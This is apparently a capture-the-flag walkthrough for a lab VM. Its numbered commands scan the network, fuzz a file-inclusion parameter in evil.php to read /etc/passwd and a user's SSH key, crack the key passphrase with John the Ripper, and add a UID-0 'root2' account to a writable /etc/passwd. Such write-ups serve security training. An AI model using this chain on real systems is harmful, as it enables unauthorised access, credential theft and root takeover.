1. -> nmap -sn 192.168.56.0/24
   ( Let's start with a network scan to find out the IP address of target machine.)


2. -> nmap -sV -A -p- 192.168.56.x  
   ( Scanning via nmap for the open services which are running on the target machine.)


3. -> dirb http://192.168.56.107/
   ( dirb is a utility for website directory enumeration which helps in finding the hidden directories of the targeted                    website.)


4. -> gobuster dir -u http://192.168.56.107/secret/ -w /usr/share/dirb/wordlists/common.txt -x php
   ( Exploring the “/secret” directory, we find nothing of interest. To further investigate, we decide to fuzz for PHP files.)


5. -> ffuf -u http://192.168.56.107/secret/evil.php?FUZZ=/etc/passwd -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fs 0
   ( Testing various actions on the “evil.php” file, we find a parameter named “command” that allows directory traversal. We verify the existence of the user “mowree” and locate an SSH key for that user.)




6. Now for ssh public key :      "http://192.168.56.107/secret/evil.php?command=/home/mowree/.ssh/id_rsa"
   Then, view page source and save the key locally in "id_rsa" file 
   ( To crack the SSH key’s password, we convert it to a format suitable for John the Ripper using ssh2john.)


7. -> ssh2john id_rsa > hash.txt
   -> chmod 700 id_rsa
   ( Save the contents of “id_rsa” locally.
     Set the permissions using “chmod 700 id_rsa“
     Convert the SSH key to the John format with ssh2john.)


9. -> john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
   ( Here, we’ve used “john” utility to crack the ssh key passphrase.)


10. -> ssh -i id_rsa mowree@192.168.56.107
( Now, login to target machine through running ssh services.)


11. -> sudo -l
      -> echo "to check if passwd is writeable" >> /etc/passwd
( For Privilege escalation from normal user to the above command we found that /etc/passwd is writeable.)


12. -> openssl passwd pass123
( Using openssl we will generate hash for the password “pass123” for our newly created root with username  “root2”.)

 Now,  Copy "root:x:0:0:root:/root:/usr/bin/zsh" line to editor and replace x with hash say   "$1$Pp1RiTYd$vp2WW9pBtKkXJdwpn8L.V1"

 Now, multiple root user couldn't be present, so replace "root" with say "root2"
 Then, Create new root user by adding "root2:$1$Pp1RiTYd$vp2WW9pBtKkXJdwpn8L.V1:0:0:root:/root:/usr/bin/zsh" to our /etc/passwd file 


13. -> su root2
      -> pass123
      ( Since the “pass123” was the password for the root2 root user that we had created.)
 

14. -> ls /
